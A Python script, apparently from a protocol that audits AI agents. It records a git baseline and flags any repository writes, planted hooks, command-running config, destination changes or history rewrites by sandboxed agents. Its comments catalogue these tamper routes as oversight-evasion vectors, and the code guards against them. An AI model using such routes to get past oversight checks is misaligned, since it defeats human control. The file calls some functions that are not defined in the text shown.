#!/usr/bin/env python3
"""Snapshot the working tree in Phase 0; compare in step 4. Answers "did a lane write anything?"

WHY.  Step 4's job is to catch an auditor that wrote into the repo -- the read-only rule is a
guardrail, not a proof, since a lane agent has Bash.  Until now that check was "run
`git status --porcelain` and compare it with the run from before step 3", by eye.  Two problems:
the baseline was not recorded anywhere, and comparing two lists of untracked files by memory is a
judgement call at the one point in the protocol that exists to avoid taking anyone's word.

Recording it makes the question mechanical, and once it is mechanical it no longer matters who
runs it -- the reason to do step 4 by hand was that an agent would be reporting on whether agents
misbehaved, and a script reports nothing, it exits 0 or 1.

  tree_state.py --save          # Phase 0: record the baseline
  tree_state.py --check         # step 4: exit 1 if anything appeared or changed since
  tree_state.py --selftest      # negative control

The snapshot is `git status --porcelain` plus the HEAD commit, stored next to this script.  It
deliberately does NOT track content hashes of tracked files: a lane that edits a tracked file
shows up in porcelain output anyway, and hashing the tree would make the check slow enough to
skip.
"""
import argparse, hashlib, os, re, subprocess, sys, json, tempfile, shutil

sys.dont_write_bytecode = True
# every git call of this process ignores refs/replace/* (and grafts are reported, replace_state): a replace ref
# makes git answer "the baseline commit's tree" with any tree (review R)
os.environ["GIT_NO_REPLACE_OBJECTS"] = "1"

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
SNAP = os.path.join(HERE, ".tree-baseline.json")


def state(repo, ignore=()):
    """`ignore` holds repo-relative paths to drop from the porcelain listing.

    The snapshot file is the obvious one: writing it makes it appear in the very listing it is
    the baseline for, so the first --check after a --save reported the baseline as a lane write.
    Caught by the selftest, which is the entire reason this script has one.
    """
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        if r.returncode != 0:
            print(f"FAIL[git-error]: git {' '.join(a)} -> {r.returncode}\n{r.stderr}", file=sys.stderr)
            sys.exit(2)
        return r.stdout
    # --untracked-files=all: a new file inside an already-untracked directory used to be hidden
    # behind the directory's one line. Each dirty path also carries a hash of its CONTENT, so a
    # lane editing a file that was already modified at baseline shows up -- before, the porcelain
    # line ("M  file") was identical and the edit was invisible.
    lines = sorted(l for l in git("status", "--porcelain", "--untracked-files=all").splitlines()
                   if l.strip() and not any(ig and ig in l for ig in ignore))
    def digest(line):
        path = line[3:].strip().strip('"').split(" -> ")[-1]
        f = os.path.join(repo, path)
        if os.path.isfile(f):
            return hashlib.sha256(open(f, "rb").read()).hexdigest()[:16]
        return "-"
    return {
        "head": git("rev-parse", "HEAD").strip(),
        "porcelain": [f"{l}  #{digest(l)}" for l in lines],
    }


# git settings: a lane that can write .git (Codex with --add-dir <project>/.git, or any nested
# repository such as audits/.git) could plant one that makes git run a program later, outside the
# sandbox (core.hooksPath, diff.external, pager.*, filters, aliases, includes, ...). Rather than
# list the dangerous keys (a list is always incomplete), every key of the repository's own config
# (local and worktree scope, included files read) is recorded, except these benign ones that the
# operator's own git commands change.
GIT_CONFIG_BENIGN = re.compile(r"^(?:user\.|branch\.|remote\.[^=]*\.(?:url|pushurl|fetch)$)", re.I)
# and these exact keys, with exact values, that submodules, git-lfs and worktrees write (RULINGS
# A10c): never a whole family (submodule.<n>.update=!cmd and filter.lfs.* with another value run
# commands), never a denylist
GIT_CONFIG_BENIGN_EXACT = [
    (r"submodule\..+\.url", r"(?!ext::)\S+"), (r"submodule\..+\.active", r"true|false"),
    (r"lfs\.repositoryformatversion", r"\d+"), (r"filter\.lfs\.required", r"true"),
    (r"filter\.lfs\.clean", r"git-lfs clean -- %f"), (r"filter\.lfs\.smudge", r"git-lfs smudge -- %f"),
    (r"filter\.lfs\.process", r"git-lfs filter-process"), (r"extensions\.worktreeconfig", r"true"),
]


def benign(kv):
    """Is one `key=value` line of the repository's config one the operator's own commands write?"""
    k, _, v = kv.partition("=")
    return bool(GIT_CONFIG_BENIGN.match(k)) or any(
        re.fullmatch(kp, k, re.I) and re.fullmatch(vp, v) for kp, vp in GIT_CONFIG_BENIGN_EXACT)


def gitmeta(repo):
    """{"hooks": {name: sha256:mode}, "config": [scope:key=value]} for one repository's git dir:
    every file under its hooks directory (wherever core.hooksPath points) and every key of its
    local and worktree config, included files read, except GIT_CONFIG_BENIGN."""
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        return r.stdout if r.returncode == 0 else ""
    hooks_dir = git("rev-parse", "--git-path", "hooks").strip()
    if hooks_dir and not os.path.isabs(hooks_dir):
        hooks_dir = os.path.join(repo, hooks_dir)
    hooks = {}
    if hooks_dir and os.path.isdir(hooks_dir):
        for root, _, files in os.walk(hooks_dir):
            for f in files:
                p = os.path.join(root, f)
                try:
                    st = os.lstat(p)
                    data = os.readlink(p).encode() if os.path.islink(p) else open(p, "rb").read()
                except OSError:
                    continue
                hooks[os.path.relpath(p, hooks_dir)] = f"{hashlib.sha256(data).hexdigest()[:16]}:{oct(st.st_mode & 0o777)}"
    conf = []
    r = subprocess.run(["git", "-C", repo, "config", "--list", "--show-scope", "--includes"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        # fail closed: an unreadable config (git older than 2.26 lacks --show-scope) must not be
        # recorded as "no risky keys"
        return {"hooks": hooks, "config": [], "error": "git config --list --show-scope failed (git 2.26 or "
                "newer is needed): " + r.stderr.strip()[:200]}
    for l in r.stdout.splitlines():
        scope, _, kv = l.partition("\t")
        if scope in ("local", "worktree", "command") and not benign(kv):
            conf.append(f"{scope}:{kv}")
    conf.sort()
    return {"hooks": hooks, "config": conf}


def replace_state(repo):
    """["replace <ref> <object>", "grafts <sha256>"]: what substitutes history in a repository (refs/replace/*,
    info/grafts). Any of it is a gitmeta failure; one not in the Stage 1 snapshot is stop 3 (review R)."""
    r = subprocess.run(["git", "-C", repo, "for-each-ref", "--format=%(refname) %(objectname)", "refs/replace/"],
                       capture_output=True, text=True)
    out = [f"replace {l}" for l in r.stdout.splitlines() if l.strip()] if r.returncode == 0 \
        else ["replace (refs unreadable)"]
    c = subprocess.run(["git", "-C", repo, "rev-parse", "--git-common-dir"], capture_output=True, text=True)
    cd = c.stdout.strip()
    gf = os.path.join(cd if os.path.isabs(cd) else os.path.join(repo, cd), "info", "grafts") if cd else ""
    if gf and os.path.lexists(gf):
        try:
            out.append(f"grafts {hashlib.sha256(open(gf, 'rb').read()).hexdigest()[:16]}")
        except OSError:
            out.append("grafts (unreadable)")
    return sorted(out)


def replace_all(repo):
    return {n: replace_state(r) for n, r in _repos(repo)}


def gitmeta_all(repo):
    """The project's repository and the audit record's (this directory's) repository."""
    out = {"project": gitmeta(repo)}
    if os.path.isdir(os.path.join(HERE, ".git")) and os.path.realpath(HERE) != os.path.realpath(repo):
        out["audits"] = gitmeta(HERE)
    return out


def heads(repo):
    """HEAD of the project's repository and of the audit record's."""
    def head(r):
        x = subprocess.run(["git", "-C", r, "rev-parse", "HEAD"], capture_output=True, text=True)
        return x.stdout.strip() if x.returncode == 0 else None
    out = {"project": head(repo)}
    if os.path.isdir(os.path.join(HERE, ".git")) and os.path.realpath(HERE) != os.path.realpath(repo):
        out["audits"] = head(HERE)
    b = subprocess.run(["git", "-C", repo, "branch", "--show-current"], capture_output=True, text=True)
    out["project_branch"] = b.stdout.strip()
    return out


def history_problems(before, repo):
    """History is append-only: every HEAD recorded at the baseline must still be an ancestor of
    the current HEAD (a `commit --amend`, reset or rebase of recorded history breaks that)."""
    out = []
    before = dict(before or {})
    branch = before.pop("project_branch", None)
    if branch is not None and branch != heads(repo).get("project_branch"):
        before.pop("project", None)      # another branch: a new run, not a rewrite of this one
    for name, old in before.items():
        r = repo if name == "project" else HERE
        if not old:
            continue
        x = subprocess.run(["git", "-C", r, "merge-base", "--is-ancestor", old, "HEAD"], capture_output=True)
        if x.returncode != 0:
            out.append(f"{name}: the commit {old[:11]} recorded at the baseline is no longer in the history of "
                       f"HEAD (amended, reset or rebased)")
    return out


# The Stage 1 snapshot (U2 §4 B1c), kept in the pin (integrity.py --pin, TOOLING_PIN.json "gitmeta"): the hooks
# (with their content, so they can be restored) and the config keys gitmeta() records, plus the settings that say
# where the run's work goes and as whom (a remote's url, credentials, user.*), and the HEADs. The release cure of
# FAIL[gitmeta] restores ONLY the snapshotted hooks and keys (--restore-gitmeta; the operator's benign keys are
# left alone). A changed remote, credential or user setting, or pinned history that is no longer an ancestor of
# HEAD, is not restorable by the operator: FAIL[env-unknown], stop 3 (the human). There is no author or identity
# test: the human and the agent commit as the same identity.
IDENT_KEYS = re.compile(r"^(?:user\.[^=]*|credential\.[^=]*)=", re.I)    # as whom: local and worktree scope
IDENT_SCOPES = ("local", "worktree")
# ... and, in EVERY scope (a ~/.gitconfig or /etc/gitconfig change redirects the run's pushes as much as a
# local one), a remote's url and every setting that redirects where the work goes or what travels with it (review U): url rewrites, extra
# HTTP headers, the remote a branch pushes or pulls to, the default push remote, the ssh command
DEST_KEYS = re.compile(r"^(?:remote\.[^=]*\.(?:url|pushurl)|url\..*\.(?:insteadof|pushinsteadof)|http\.(?:.*\.)?extraheader|branch\.[^=]*\."
                       r"(?:pushremote|remote)|remote\.pushdefault|core\.sshcommand)=", re.I)


def _repos(repo):
    """[(name, path)]: the project's repository and the audit record's (as gitmeta_all)."""
    out = [("project", repo)]
    if os.path.isdir(os.path.join(HERE, ".git")) and os.path.realpath(HERE) != os.path.realpath(repo):
        out.append(("audits", HERE))
    return out


def _config_lines(repo, scopes=("local", "worktree", "command")):
    """["scope:key=value"] of a repository's config in `scopes` (included files read), or None if unreadable."""
    r = subprocess.run(["git", "-C", repo, "config", "--list", "--show-scope", "--includes"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        return None
    return sorted(f"{sc}:{kv}" for sc, _, kv in (l.partition("\t") for l in r.stdout.splitlines()) if sc in scopes)


def _ident_line(l):
    """Is a "scope:key=value" line one identity() records? (review L2: user.* and credential.* in the repository's
    own config only -- a human editing ~/.gitconfig is no foreign change; destinations, as core.hooksPath, in every
    scope)"""
    sc, _, kv = l.partition(":")
    return l.startswith("unreadable:") or bool(DEST_KEYS.match(kv)) or (sc in IDENT_SCOPES and bool(IDENT_KEYS.match(kv)))


def identity(repo):
    """The user and credential settings of a repository's own config, and its destination settings in every scope
    but the command line (_ident_line)."""
    return [l for l in (_config_lines(repo, ("local", "worktree", "global", "system")) or ["unreadable:="])
            if _ident_line(l)]


def hook_files(repo, hd=None):
    """{path under the hooks dir (`hd`, default git's): {"sig": as gitmeta(), "mode": int, "b64": content}}: the
    hooks, restorable."""
    import base64
    hd = hd or _hooks_dir(repo)
    out = {}
    for root, _, files in (os.walk(hd) if hd and os.path.isdir(hd) else ()):
        for f in files:
            p = os.path.join(root, f)
            try:
                st = os.lstat(p)
                data = os.readlink(p).encode() if os.path.islink(p) else open(p, "rb").read()
            except OSError:
                continue
            out[os.path.relpath(p, hd)] = {"sig": f"{hashlib.sha256(data).hexdigest()[:16]}:{oct(st.st_mode & 0o777)}",
                                           "mode": st.st_mode & 0o777, "b64": base64.b64encode(data).decode()}
    return out


def _hooks_dir(repo):
    r = subprocess.run(["git", "-C", repo, "rev-parse", "--git-path", "hooks"], capture_output=True, text=True)
    hd = r.stdout.strip() if r.returncode == 0 else ""
    return os.path.join(repo, hd) if hd and not os.path.isabs(hd) else hd


def _real_hooks_dir(repo):
    """The hooks directory git uses (wherever core.hooksPath points), symlinks resolved; "" if unknown."""
    hd = _hooks_dir(repo)
    return os.path.realpath(hd) if hd else ""


def _own_hooks_dir(repo):
    """<gitdir>/hooks (the common git dir's), symlinks resolved: the ONLY directory --restore-gitmeta ever writes
    or deletes in (attack H: a core.hooksPath at another directory made the cure delete that directory's files)."""
    r = subprocess.run(["git", "-C", repo, "rev-parse", "--git-common-dir"], capture_output=True, text=True)
    d = r.stdout.strip() if r.returncode == 0 else ""
    if not d:
        return ""
    return os.path.realpath(os.path.join(d if os.path.isabs(d) else os.path.join(repo, d), "hooks"))


ALL_SCOPES = ("local", "worktree", "global", "system", "command")
HOOKSPATH_KEY = re.compile(r"^core\.hookspath=", re.I)


def hookspath(repo):
    """Every core.hooksPath setting of a repository, in every scope (a global or system one counts: it moves the
    hooks directory as much as a local one does)."""
    return [l for l in (_config_lines(repo, ALL_SCOPES) or ["unreadable:="])
            if HOOKSPATH_KEY.match(l.partition(":")[2]) or l.startswith("unreadable:")]


def snapshot(repo):
    """The Stage 1 snapshot the pin records (see IDENT_KEYS)."""
    return {"meta": gitmeta_all(repo), "hooks": {n: hook_files(r) for n, r in _repos(repo)},
            "ident": {n: identity(r) for n, r in _repos(repo)}, "heads": heads(repo),
            "hooks_dir": {n: _real_hooks_dir(r) for n, r in _repos(repo)},
            "hookspath": {n: hookspath(r) for n, r in _repos(repo)}, "subst": replace_all(repo)}


def pin_snapshot():
    """The Stage 1 snapshot in the selected project's pin, or None (no pin, an older pin, no project)."""
    try:
        sys.path.insert(0, HERE)
        import project, integrity
        cfg, _ = project.select(None)
        p = os.path.join(project.REPO, cfg["rounds_dir"], integrity.PIN)
        return json.load(open(p)).get("gitmeta") if os.path.exists(p) else None
    except Exception:       # noqa: BLE001 -- no snapshot: the baseline comparison alone, as before B1c
        return None


def release_run():
    """Is the selected project a release run? (A reverted foreign change passes the check only there: in dev the
    human decides every stop, and a re-save after a GREEN Phase 0 clears it, as before B1c.)"""
    try:
        sys.path.insert(0, HERE)
        import project
        return project.mode(project.select(None)[0]) == "release"
    except Exception:       # noqa: BLE001
        return False


def env_problems(pin, repo, baseline_heads=None):
    """What only the human can clear (stop 3): a remote url, credential or user setting changed since the Stage 1
    snapshot, or a HEAD recorded at the pin or the baseline that is no longer an ancestor of HEAD."""
    out = history_problems(baseline_heads, repo) if baseline_heads else []
    if pin:
        for n, r in _repos(repo):
            was, now = set(l for l in (pin.get("ident") or {}).get(n, []) if _ident_line(l)), set(identity(r))
            for l in sorted(was ^ now):
                out.append(f"{n}: git setting {'added' if l in now else 'removed'} since the Stage 1 snapshot: {l}")
            # where the hooks live (review H, attack H): the resolved hooks directory and core.hooksPath in every
            # scope. A different one is not restorable by the operator: the cure would write into another directory
            if "hooks_dir" in pin and (pin["hooks_dir"] or {}).get(n) != _real_hooks_dir(r):
                out.append(f"{n}: the hooks directory is {_real_hooks_dir(r) or '(unknown)'}, not the Stage 1 "
                           f"snapshot's {(pin['hooks_dir'] or {}).get(n)}")
            for l in replace_state(r):
                if l not in set((pin.get("subst") or {}).get(n, [])):
                    out.append(f"{n}: history substitution not in the Stage 1 snapshot: {l}")
            if "hookspath" in pin:
                was_h, now_h = set((pin["hookspath"] or {}).get(n, [])), set(hookspath(r))
                for l in sorted(was_h ^ now_h):
                    out.append(f"{n}: git setting {'added' if l in now_h else 'removed'} since the Stage 1 snapshot: "
                               f"{l}")
        out += [x for x in history_problems(pin.get("heads"), repo) if x not in out]
    return out


def reverted_to_baseline(repo, base, head, base_tree=None):
    """Was a foreign change since the baseline reverted? `base` is an ancestor of `head`, some commit between them
    changed files (a range of empty commits only is the operator's or head-moved, operator_moves), and HEAD's tree
    is the baseline's tree (U2 §4: a revert is accepted by tree equality, never by its commit subject). The
    baseline's tree is the hash --save recorded (`base_tree`), never asked of git again (review R: a replace ref
    made the baseline commit's tree any tree); a baseline without one accepts nothing."""
    if not base_tree:
        return False
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        return r.returncode, r.stdout.strip()
    if git("merge-base", "--is-ancestor", base, head)[0]:
        return False
    t1 = git("rev-parse", f"{head}^{{tree}}")
    if t1[0] or t1[1] != base_tree:
        return False
    return any(git("diff-tree", "--quiet", "--no-commit-id", "-r", l.split()[0] + "^", l.split()[0])[0]
               for l in git("rev-list", "--first-parent", f"{base}..{head}")[1].splitlines())


def revert_foreign(repo, path, pin=None):
    """The release cure of FAIL[head-moved]: `git revert` over the whole foreign range since the baseline, newest
    first along the first parents, `-m 1` for a merge (the operator's empty commits are skipped), each committed
    with git's message, `--no-verify` and `core.hooksPath=/dev/null` (no hook runs). Refused while the git hooks
    or config differ from the baseline or the Stage 1 snapshot. The check then passes only if HEAD's tree equals
    the baseline's."""
    if not os.path.exists(path):
        print(f"FAIL[no-baseline]: no baseline at {path}", file=sys.stderr); return 2
    before = json.load(open(path))
    env = env_problems(pin, repo, before.get("heads"))
    if env:
        for x in env:
            print(f"GITMETA[gitmeta] {x}")
        print("FAIL[env-unknown]: recorded history was rewritten or a remote, credential or user setting changed: "
              "only the human clears this (stop 3); nothing reverted", file=sys.stderr); return 1
    # the reverts commit: never with hooks or config other than the snapshot's (review K: a planted post-commit hook
    # ran). Any gitmeta change is restored first (--restore-gitmeta), and git runs with no hooks at all
    now_meta = gitmeta_all(repo)
    meta = gitmeta_diff(before["gitmeta"], now_meta) if "gitmeta" in before else []
    if pin and "meta" in pin:
        meta += [x for x in gitmeta_diff(pin["meta"], now_meta) if x not in meta]
    meta += [f"{n}: history substitution: {l}" for n, ls in replace_all(repo).items() for l in ls]
    if meta:
        for x in meta:
            print(f"GITMETA[gitmeta] {x}")
        print("FAIL[gitmeta]: git hooks or config differ from the baseline or the Stage 1 snapshot: nothing reverted "
              "(git would run them); python3 audits/tree_state.py --restore-gitmeta first", file=sys.stderr); return 1
    def git(*a):
        r = subprocess.run(["git", "-C", repo, "-c", f"core.hooksPath={os.devnull}", "-c", "core.fsmonitor=false",
                            *a], capture_output=True, text=True)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    rc, revs, err = git("rev-list", "--first-parent", f"{before['head']}..HEAD")
    if rc:
        print(f"FAIL[git-error]: git rev-list: {err}", file=sys.stderr); return 2
    for c in revs.split():
        ps = git("rev-list", "--parents", "-n", "1", c)[1].split()
        if git("rev-parse", f"{c}^{{tree}}")[1] == git("rev-parse", f"{ps[1]}^{{tree}}")[1]:
            continue        # an empty commit changes nothing to revert
        rc, _o, err = git("revert", "--no-commit", "--no-gpg-sign", *(["-m", "1"] if len(ps) > 2 else []), c)
        if not rc:      # the message git prepared ('Revert "<subject>"' ...), committed without any hook
            rc, _o, err = git("commit", "--no-verify", "--no-gpg-sign", "--no-edit")
        if rc:
            git("revert", "--abort")
            print(f"FAIL[head-moved]: git revert of {c[:11]} failed ({err[:200]}): only the human clears this",
                  file=sys.stderr); return 1
        print(f"reverted {c[:11]}" + (" (a merge: -m 1)" if len(ps) > 2 else ""))
    if not reverted_to_baseline(repo, before["head"], git("rev-parse", "HEAD")[1], before.get("tree")):
        print("FAIL[head-moved]: after the reverts HEAD's tree still differs from the baseline's", file=sys.stderr)
        return 1
    print("ok: HEAD's tree equals the baseline's again; re-run python3 audits/tree_state.py --check")
    return 0


def _snapshotted(line):
    """Is a "scope:key=value" config line one the Stage 1 snapshot records (and the cure restores)?"""
    return not benign(line.partition(":")[2])


def restore_gitmeta(repo, pin):
    """The release cure of FAIL[gitmeta]: restore the hooks and the config keys of the Stage 1 snapshot -- only those
    (the operator's benign keys, a remote's url, credentials and user.* are never touched). Refused (stop 3) when a
    remote, credential or user setting changed or pinned history is no longer an ancestor."""
    import base64
    if not pin or not all(k in pin for k in ("meta", "hooks", "hooks_dir", "hookspath")):
        print("FAIL[env-unknown]: the pin has no (complete) Stage 1 snapshot of the git hooks and config, so there is "
              "nothing the operator may restore to: only the human clears this (stop 3); nothing restored (a re-pin "
              "adds the snapshot when the pin has none)", file=sys.stderr); return 1
    env = env_problems(pin, repo)
    # the cure writes and deletes ONLY in <gitdir>/hooks, and only when that is the snapshot's hooks directory too
    # (review H): anything else -- a core.hooksPath anywhere, a hooks dir that is a symlink elsewhere -- is stop 3
    for name, r in _repos(repo):
        hd, own = _real_hooks_dir(r), _own_hooks_dir(r)
        if not hd or hd != own or hd != (pin["hooks_dir"] or {}).get(name):
            env.append(f"{name}: the hooks directory {hd or '(unknown)'} is not both <gitdir>/hooks ({own or '?'}) and "
                       f"the Stage 1 snapshot's ({(pin['hooks_dir'] or {}).get(name)}): the cure writes nowhere else")
            continue
        for rel in set(hook_files(r)) | set((pin.get("hooks") or {}).get(name, {})):
            parent = os.path.realpath(os.path.dirname(os.path.join(hd, rel)))
            if os.path.isabs(rel) or not (parent == hd or parent.startswith(hd + os.sep)):
                env.append(f"{name}: hook path {rel} resolves outside {hd}")
    if env:
        for x in env:
            print(f"GITMETA[gitmeta] {x}")
        print("FAIL[env-unknown]: a remote, credential or user setting changed, or pinned history was rewritten: "
              "only the human clears this (stop 3); nothing restored", file=sys.stderr); return 1
    for name, r in _repos(repo):
        snap = (pin["meta"].get(name) or {})
        lines = _config_lines(r)
        if snap.get("error") or lines is None:
            print(f"FAIL[gitmeta]: {name}: the config cannot be read or was not recorded: only the human can restore "
                  f"it", file=sys.stderr); return 1
        want, have = {}, {}
        for d_, src in ((want, snap.get("config", [])), (have, [l for l in lines if _snapshotted(l)])):
            for l in src:
                sc, _, kv = l.partition(":")
                k, _, v = kv.partition("=")
                d_.setdefault((sc, k), []).append(v)
        for sc, k in sorted(set(want) | set(have)):
            if sorted(want.get((sc, k), [])) == sorted(have.get((sc, k), [])):
                continue
            if sc not in ("local", "worktree"):
                print(f"FAIL[gitmeta]: {name}: {sc}:{k} is not in a config file the operator restores",
                      file=sys.stderr); return 1
            subprocess.run(["git", "-C", r, "config", f"--{sc}", "--unset-all", k], capture_output=True)
            for v in want.get((sc, k), []):
                subprocess.run(["git", "-C", r, "config", f"--{sc}", "--add", k, v], capture_output=True)
            print(f"restored {name}: git config {sc}:{k}")
        hd = _own_hooks_dir(r)
        cur, hs = hook_files(r, hd), (pin.get("hooks") or {}).get(name, {})
        for rel in sorted(set(cur) - set(hs)):
            os.remove(os.path.join(hd, rel))
            print(f"restored {name}: hook {rel} removed")
        for rel, e in sorted(hs.items()):
            if (cur.get(rel) or {}).get("sig") != e["sig"]:
                f = os.path.join(hd, rel)
                os.makedirs(os.path.dirname(f), exist_ok=True)
                if os.path.islink(f):
                    os.remove(f)
                open(f, "wb").write(base64.b64decode(e["b64"]))
                os.chmod(f, e["mode"])
                print(f"restored {name}: hook {rel}")
    left = gitmeta_diff(pin["meta"], gitmeta_all(repo))
    for x in left:
        print(f"GITMETA[gitmeta] {x}")
    if left:
        print("FAIL[gitmeta]: the snapshot could not be restored", file=sys.stderr); return 1
    print("ok: the git hooks and config are the Stage 1 snapshot's; re-run python3 audits/tree_state.py --check")
    return 0


def gitmeta_errors(meta):
    return [f"{name}: {m['error']}" for name, m in (meta or {}).items() if isinstance(m, dict) and m.get("error")]


def gitmeta_diff(before, now):
    out = gitmeta_errors(now)
    for name in sorted(set(before) | set(now)):
        b, n = before.get(name, {}), now.get(name, {})
        bh, nh = b.get("hooks", {}), n.get("hooks", {})
        for h in sorted(set(bh) | set(nh)):
            if bh.get(h) != nh.get(h):
                out.append(f"{name}: hook {h} " + ("added" if h not in bh else "removed" if h not in nh else "changed"))
        for c in sorted(set(b.get("config", [])) ^ set(n.get("config", []))):
            out.append(f"{name}: git config {'added' if c in n.get('config', []) else 'removed'}: {c}")
    return out


def _rel(repo, path):
    try:    return os.path.relpath(os.path.abspath(path), os.path.abspath(repo))
    except ValueError: return os.path.basename(path)


def _save_refusal(path, release, hist):
    """Who clears a baseline --save refused (polish 2026-10-24): dev -- the human, as always; release -- a changed
    hook or config key is the operator's cure (--restore-gitmeta, then --save again), while rewritten or substituted
    history is stop 3 (FAIL[env-unknown], the human), as in --check."""
    if not release:
        return ("Show this to the human; do not re-save until they have checked it. Only the human may clear it, "
                f"after checking: by deleting {path} (RUN.md, 'Stops that remain').")
    if hist:
        return ("FAIL[env-unknown]: recorded history was rewritten or substituted: only the human can check and clear "
                f"this (stop 3), by deleting {path} after checking; do not re-save.")
    return ("Release: python3 audits/tree_state.py --restore-gitmeta restores the hooks and keys of the Stage 1 "
            "snapshot (only those), then --save again.")


def save(repo, path, release=None):
    """`release`: a release run (default: the selected project's mode); only the refusal's message depends on it."""
    if release is None:
        release = release_run()
    s = state(repo, ignore=(_rel(repo, path),))
    s["gitmeta"] = gitmeta_all(repo)
    s["heads"] = heads(repo)
    tr = subprocess.run(["git", "-C", repo, "rev-parse", "HEAD^{tree}"], capture_output=True, text=True)
    s["tree"] = tr.stdout.strip() if tr.returncode == 0 else None    # HEAD's tree: the revert test's reference
    sub = [f"{n}: history substitution: {l}" for n, ls in replace_all(repo).items() for l in ls]
    if sub:
        for x in sub:
            print(f"GITMETA[gitmeta] {x}")
        print("FAIL[gitmeta]: refs/replace or info/grafts substitute history: no baseline is saved over them. "
              + _save_refusal(path, release, True), file=sys.stderr)
        return 1
    # the hooks and command-running config must also not change BETWEEN rounds (a hook planted
    # during one round would otherwise be accepted into the next baseline)
    if os.path.exists(path):
        try:
            old = json.load(open(path)).get("gitmeta")
        except (OSError, ValueError):
            old = None
        d = gitmeta_diff(old, s["gitmeta"]) if old is not None else []
        try:
            hist = history_problems(json.load(open(path)).get("heads"), repo)
        except (OSError, ValueError):
            hist = []
        d += hist
        if d:
            for x in d:
                print(f"GITMETA[gitmeta] {x}")
            print("FAIL[gitmeta]: git hooks or git config changed, or recorded history was rewritten, since the last "
                  "baseline -- an integrity failure (a planted hook runs outside any sandbox; history is "
                  "append-only). " + _save_refusal(path, release, bool(hist)), file=sys.stderr)
            return 1
        try:
            s["resaved"] = json.load(open(path)).get("resaved", [])   # the operator's re-saves, kept
        except (OSError, ValueError):
            pass
    json.dump(s, open(path, "w"), indent=1)
    print(f"baseline saved: HEAD {s['head'][:11]}, {len(s['porcelain'])} dirty path(s)")
    for l in s["porcelain"]:
        print(f"  {l}")
    return 0


def check(repo, path, log_text=None, pin=None, reverts=False, round_dirs=None):
    """`reverts` is "a release run": only there are the Stage 1 snapshot (`pin`) and the stop-3 identity/destination
    checks applied, and a reverted foreign change accepted (review M1); dev is as before B1c (every gitmeta change,
    rewritten history included, is FAIL[gitmeta], the human's)."""
    if not reverts:
        pin = None
    if not os.path.exists(path):
        # Refuse to pass vacuously. No baseline means the question cannot be answered, and
        # "no baseline" must not read the same as "nothing changed".
        print(f"FAIL[no-baseline]: no baseline at {path} — Phase 0 did not run --save, so this check cannot "
              f"tell a lane write from a file that was already there.", file=sys.stderr)
        return 2
    before, now = json.load(open(path)), state(repo, ignore=(_rel(repo, path),))
    appeared = [l for l in now["porcelain"] if l not in before["porcelain"]]
    vanished = [l for l in before["porcelain"] if l not in now["porcelain"]]
    moved = before["head"] != now["head"]
    now_meta = gitmeta_all(repo)
    meta_diff = gitmeta_diff(before["gitmeta"], now_meta) if "gitmeta" in before else []
    if pin and "meta" in pin:     # and against the Stage 1 snapshot (B1c), which the cure restores
        meta_diff += [x for x in gitmeta_diff(pin["meta"], now_meta) if x not in meta_diff]
    meta_diff += [f"{n}: history substitution: {l}" for n, ls in replace_all(repo).items() for l in ls]
    if reverts:
        env = env_problems(pin, repo, before.get("heads"))
    else:
        env, meta_diff = [], meta_diff + history_problems(before.get("heads"), repo)
    for x in meta_diff + env:
        print(f"GITMETA[gitmeta] {x}")
    if env:
        print("FAIL[gitmeta]: recorded history was rewritten, or a git remote, credential or user setting changed, "
              "since the baseline or the Stage 1 snapshot (history is append-only).")
        print("FAIL[env-unknown]: only the human can check and clear this (stop 3): the operator restores neither "
              "history nor where the work goes or as whom.")
        return 1
    if meta_diff and not reverts:
        print("FAIL[gitmeta]: git hooks or git config changed, or recorded history was rewritten, since the "
              "baseline -- an integrity failure (a planted hook would run outside any sandbox at the "
              "next commit; history is append-only).")
        return 1
    if meta_diff:
        print("FAIL[gitmeta]: git hooks or git config changed since the baseline -- an integrity failure (a planted "
              "hook would run outside any sandbox at the next commit). Release: python3 audits/tree_state.py "
              "--restore-gitmeta restores the hooks and keys of the Stage 1 snapshot (only those).")
        return 1

    for l in appeared:
        print(f"APPEARED  {l}")
    for l in vanished:
        print(f"VANISHED  {l}")
    if not appeared and not vanished:
        if moved:
            # every non-zero exit prints a coded failure line (release trial S2: an uncoded "note" was
            # filed as unknown, a human stop, and the re-save needed a GREEN Phase 0 that a record fault
            # kept RED). Moves that changed nothing (the operator's empty commits) are curable here.
            why = operator_moves(repo, before["head"], now["head"], log_text)
            if why and reverts and reverted_to_baseline(repo, before["head"], now["head"], before.get("tree")):
                print(f"NOTE[reverted] HEAD moved {before['head'][:11]} -> {now['head'][:11]} since the baseline "
                      f"({why}), but its tree equals the baseline's: the foreign change was reverted")
                print(f"ok: working tree unchanged since the baseline ({len(now['porcelain'])} path(s) dirty, all "
                      f"pre-existing); HEAD's tree is the baseline's")
                return 0
            if why and reverts and round_moves(repo, before["head"], now["head"], round_dirs) is None:
                # release (trial #9): the move is the operator's own commits up to the commit the round audits,
                # made before the round was cut; Phase 0 could not save after them. Not a lane's: the same cure
                print(f"FAIL[head-moved-operator] HEAD moved {before['head'][:11]} -> {now['head'][:11]} since the "
                      f"baseline only by the operator's own commits up to the commit a round was cut from (Phase 0 "
                      f"did not save the baseline after them; {why}): re-save with python3 audits/tree_state.py "
                      f"--resave-operator --reason \"<the round, why Phase 0 could not save>\"")
                return 1
            if why:
                print(f"FAIL[head-moved] HEAD moved {before['head'][:11]} -> {now['head'][:11]} since the baseline "
                      f"and not only by the operator's empty commits ({why}): a lane may have committed. Release: "
                      f"python3 audits/tree_state.py --revert-foreign reverts the whole foreign range")
            else:
                print(f"FAIL[head-moved-operator] HEAD moved {before['head'][:11]} -> {now['head'][:11]} since the "
                      f"baseline only by the operator's prescribed empty commits, listed by hash: re-save "
                      f"with python3 audits/tree_state.py --resave-operator --reason \"<which commit, why>\"")
            return 1
        print(f"ok: working tree unchanged since the baseline "
              f"({len(now['porcelain'])} path(s) dirty, all pre-existing)")
        return 0
    print(f"FAIL[tree-changed]: {len(appeared)} appeared, {len(vanished)} vanished since the baseline — "
          f"a lane may have written. Do not adjudicate until you know which.")
    return 1


